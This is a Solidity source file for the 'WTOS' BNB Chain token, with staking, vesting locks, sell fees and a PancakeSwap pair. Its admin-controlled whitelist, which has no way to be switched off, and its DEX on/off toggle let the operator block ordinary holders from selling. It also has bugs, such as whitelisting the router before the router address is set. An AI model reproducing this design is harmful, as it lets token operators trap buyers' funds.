// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IPancakeSwapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IPancakeSwapV2Router01 {
    function factory() external pure returns (address);
}

contract WTOS is IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint256 public constant initialSupply = 36 * 1e7 * 1e18;
    uint256 public totalStakeAmount;
    uint256 public totalLockAmount;
    uint public stakeMinAmount;

    address public Admin;
    address public Owner;
    address public USDT;
    address public constant Community = address(0x61d84Cc68854773d840bfd47C3588C0c96C903ec); 
    address public constant DAOLab = address(0x72dB54b0a8835F371c3A10AB408d6A0BeD300C46); 
    address public constant NODE = address(0x526a96b1bc09BFc4733561D29fc8CfF48FC6dacA); 
    mapping(address => bool) public NoFee;

    uint256 public constant PerDAYSecond = 86400;

    bool public DEXDisable;
    bool public originERC20;
    bool public NoWhiteListSell;

    address public uniswapV2Pair;
    IPancakeSwapV2Router01 public uniswapV2Router;

    struct BurnData {
        address account;
        uint256 amount;
    }

    struct lockData {
        address account;
        uint256 totalAmount;
        uint256 paidReward;
        uint256 startTime;
        uint256 perMonthReward;
    }

    struct stakeData {
        address account;
        uint256 day;
        uint256 rate;
        uint256 perDayReward;
        uint256 stakeAmount;
        uint256 paidReward;
        uint256 startTime;
        bool finish;
    }

    mapping(address => stakeData[]) public tokenStake;
    mapping(address => lockData[]) public tokenLock;
    mapping(address => bool) public whiteList;

    BurnData[] public BurnRecords;
    uint256[4] public stakeDays;
    uint256[4] public stakeRate;

    modifier OnlyAdmin() {
        require(msg.sender == Admin, "You are note Admin");
        _;
    }

    modifier EOA() {
        require(gasleft() != 0);
        require(tx.origin == msg.sender, "EOA Only");
        address account = msg.sender;
        require(account.code.length == 0, "msg.sender.code.length == 0");
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        require(size == 0, "extcodesize == 0");
        _;
    }

    constructor() {
        stakeMinAmount = 1e20;
        Owner = address(0x074573f3656528460bF165cF055fC57Ac5D0E9d9);
        Admin = msg.sender;
        _mint(Owner, (initialSupply * 80) / 100);
        _mint(Community, (initialSupply * 10) / 100);
        _mint(DAOLab, (initialSupply * 3) / 100);
        _mint(NODE, (initialSupply * 2) / 100);
        _mint(address(this), (initialSupply * 5) / 100);

        stakeDays = [90, 180, 270, 360];
        stakeRate = [200, 300, 400, 500]; 
        _approve(Owner, address(this), type(uint256).max);
        initNoFeeWhiteList();

        if (block.chainid == 56) {
            USDT = address(0x55d398326f99059fF775485246999027B3197955);
            uniswapV2Router = IPancakeSwapV2Router01(
                0x10ED43C718714eb63d5aA57B78B54704E256024E
            );
            uniswapV2Pair = IPancakeSwapV2Factory(uniswapV2Router.factory())
                .createPair(address(this), USDT);
        } else if (block.chainid == 97) {
            USDT = address(0x902Fb2624da9A6c792db40CA9C7733AAc578F17e);
            uniswapV2Router = IPancakeSwapV2Router01(
                0xCc7aDc94F3D80127849D2b41b6439b7CF1eB4Ae0
            );
            uniswapV2Pair = IPancakeSwapV2Factory(uniswapV2Router.factory())
                .createPair(address(this), USDT);
        }
    }

    function initNoFeeWhiteList() internal {
        whiteList[address(uniswapV2Router)] = true;
        NoFee[Owner] = true;
        whiteList[Owner] = true;
        NoFee[Admin] = true;
        whiteList[Admin] = true;
        NoFee[Community] = true;
        whiteList[Community] = true;
        NoFee[Community] = true;
        whiteList[Community] = true;
        NoFee[DAOLab] = true;
        whiteList[DAOLab] = true;
        NoFee[NODE] = true;
        whiteList[NODE] = true;
    }

    function setStakeDays(uint256[4] calldata _stakeDays) external OnlyAdmin {
        stakeDays = _stakeDays;
    }

    function setstakeRate(uint256[4] calldata _stakeRate) external OnlyAdmin {
        stakeRate = _stakeRate;
    }

    function setStakeDays(uint256 _stakeMinAmount) external OnlyAdmin {
        stakeMinAmount = _stakeMinAmount;
    }

    function permission() external OnlyAdmin {
        Admin = address(0);
    }

    function setNoFee(address account) external OnlyAdmin {
        NoFee[account] = !NoFee[account];
    }

    function newOwner(address _account) external OnlyAdmin {
        Owner = _account;
    }

    function setWhiteList(address _account) external OnlyAdmin {
        whiteList[_account] = !whiteList[_account];
    }

    function setDex() external OnlyAdmin {
        DEXDisable = !DEXDisable;
    }

    function setOriginERC20() external OnlyAdmin {
        originERC20 = !originERC20;
    }

    function getMonth(uint256 timestamp) public view returns (uint) {
        require(
            timestamp <= block.timestamp,
            "Input timestamp can't be in the future"
        );
        return min(12, (block.timestamp - timestamp) / 30 days);
    }

    function min(uint256 a, uint256 b) internal pure returns (uint) {
        return a < b ? a : b;
    }

    function getDay(uint timestamp) public view returns (uint) {
        return
            (
                block.timestamp > timestamp
                    ? block.timestamp - timestamp
                    : timestamp - block.timestamp
            ) / 1 days;
    }

    function getUserTokenLock(
        address user
    ) external view returns (lockData[] memory) {
        lockData[] memory _lockData = new lockData[](tokenLock[user].length);
        for (uint256 i = 0; i < _lockData.length; i++) {
            _lockData[i] = tokenLock[user][i];
        }
        return _lockData;
    }

    function getUserTokenStake(
        address user
    ) external view returns (stakeData[] memory) {
        stakeData[] memory _stakeData = new stakeData[](
            tokenStake[user].length
        );
        for (uint256 i = 0; i < _stakeData.length; i++) {
            _stakeData[i] = tokenStake[user][i];
        }
        return _stakeData;
    }

    function withdrawUnlock(uint id) external EOA {
        uint amount = getMonth(tokenLock[msg.sender][id].startTime) *
            tokenLock[msg.sender][id].perMonthReward -
            tokenLock[msg.sender][id].paidReward; 
        tokenLock[msg.sender][id].paidReward += amount;
        require(amount > 0, "There are no rewards to claim");
        require(
            tokenLock[msg.sender][id].paidReward <=
                tokenLock[msg.sender][id].totalAmount,
            "The available quantity is exceeded"
        );
        _original_transfer(address(this), msg.sender, amount);
    }

    function ownerSender(address to, uint amount) external {
        require(msg.sender == Owner, "you are not owner");
        _original_transfer(Owner, to, amount * 1e18);
    }

    function addLockTokens(
        address[] memory accounts,
        uint256[] memory amounts
    ) external {
        require(msg.sender == Owner, "You are not owner");
        for (uint256 i = 0; i < accounts.length; i++) {
            addLockToken(accounts[i], amounts[i]);
        }
    }

    function addLockToken(address user, uint256 amount) internal {
        if (user == Owner || user == address(0) || amount < 1e17) {} else {
            if (!whiteList[user]) {
                whiteList[user] = true;
            }

            tokenLock[user].push(
                lockData({
                    account: user,
                    totalAmount: amount,
                    paidReward: 0, 
                    startTime: block.timestamp,
                    perMonthReward: amount / 12 
                })
            );

            _original_transfer(Owner, address(this), amount);
        }
    }

    function calcCurrectStakeReward(
        address user,
        uint256 id
    ) public view returns (uint256) {
        uint endtime = tokenStake[user][id].startTime +
            (tokenStake[user][id].day * PerDAYSecond);
        uint endtime2 = block.timestamp > endtime ? endtime : block.timestamp;
        return
            ((tokenStake[user][id].perDayReward *
                (endtime2 - tokenStake[user][id].startTime)) / PerDAYSecond) -
            tokenStake[user][id].paidReward;
    }

    function withdrawStakeReward(uint256 id) public EOA {
        uint amount = calcCurrectStakeReward(msg.sender, id);
        if (amount >= 1e17) {
            tokenStake[msg.sender][id].paidReward += amount;
            require(
                tokenStake[msg.sender][id].paidReward <=
                    tokenStake[msg.sender][id].perDayReward *
                        tokenStake[msg.sender][id].day,
                "Exceeds the total reward amount"
            );
            _original_transfer(address(this), msg.sender, amount);
        }
    }

    function unstake(uint256 id) external virtual EOA {
        require(
            block.timestamp >=
                tokenStake[msg.sender][id].startTime +
                    (tokenStake[msg.sender][id].day) *
                    PerDAYSecond,
            "Insufficient pledge time"
        );
        require(
            !tokenStake[msg.sender][id].finish,
            "It's already been unstaked"
        );
        withdrawStakeReward(id);
        _original_transfer(
            address(this),
            msg.sender,
            tokenStake[msg.sender][id].stakeAmount
        );
        tokenStake[msg.sender][id].finish = true;
    }

    function isValidDay(uint256 _day) public view returns (bool) {
        for (uint i = 0; i < stakeDays.length; i++) {
            if (_day == stakeDays[i]) {
                return true;
            }
        }
        return false;
    }

    function calcPerDayStakeReward(
        uint256 amount,
        uint256 day
    ) public view returns (uint256) {
        for (uint256 i; i < stakeDays.length; i++) {
            if (day == stakeDays[i]) {
                return ((amount * stakeRate[i]) / 10000) / 360;
            }
        }
        revert("Day not found in stakeDays");
    }

    function getRateFromDay(uint256 _day) public view returns (uint256) {
        for (uint256 i; i < stakeDays.length; i++) {
            if (stakeDays[i] == _day) {
                return stakeRate[i];
            }
        }
        return 0;
    }

    function stake(uint256 amount, uint256 _day) external virtual EOA {
        require(isValidDay(_day), "stake days must be 90 180 270 360"); 
        require(amount >= stakeMinAmount, "stake amount too little");
        _original_transfer(msg.sender, address(this), amount);
        totalStakeAmount += amount;
        tokenStake[msg.sender].push(
            stakeData({
                account: msg.sender,
                day: _day,
                rate: getRateFromDay(_day),
                perDayReward: calcPerDayStakeReward(amount, _day), 
                stakeAmount: amount, 
                paidReward: 0, 
                startTime: block.timestamp, 
                finish: false 
            })
        );
    }

    function name() public view virtual returns (string memory) {
        return "WTOS";
    }

    function symbol() public view virtual returns (string memory) {
        return "WTOS";
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        if (msg.sender == Owner) {
            addLockToken(to, amount);
            return true;
        } else {
            _transfer(msg.sender, to, amount);
            return true;
        }
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function allot(address from, uint256 amount) internal {
        _original_transfer(from, NODE, amount / 100); 
        _original_transfer(from, address(this), (amount * 2) / 100);
        _burn(from, (amount * 2) / 100); 
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (originERC20 || NoFee[from] || NoFee[to]) {
            _original_transfer(from, to, amount);
            return;
        }

        if (!NoWhiteListSell) {
            require(whiteList[from], "You're not in whitelist");
        }

        if (DEXDisable) {
            require(
                from != uniswapV2Pair && to != uniswapV2Pair,
                "DEX disable"
            );
        }

        uint256 _amount = amount;

        if (to == address(uniswapV2Pair)) {
            allot(from, amount);
            _amount = (amount * 95) / 100;
        }

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= _amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - _amount;

            _balances[to] += _amount;
        }
        emit Transfer(from, to, _amount);
    }

    function _original_transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;

            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;

            _totalSupply -= amount;
        }
        emit Transfer(account, address(0), amount);
    }

    function burn(uint256 amount) external virtual {
        _burn(msg.sender, amount);
        BurnRecords.push(BurnData({account: msg.sender, amount: amount}));
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

}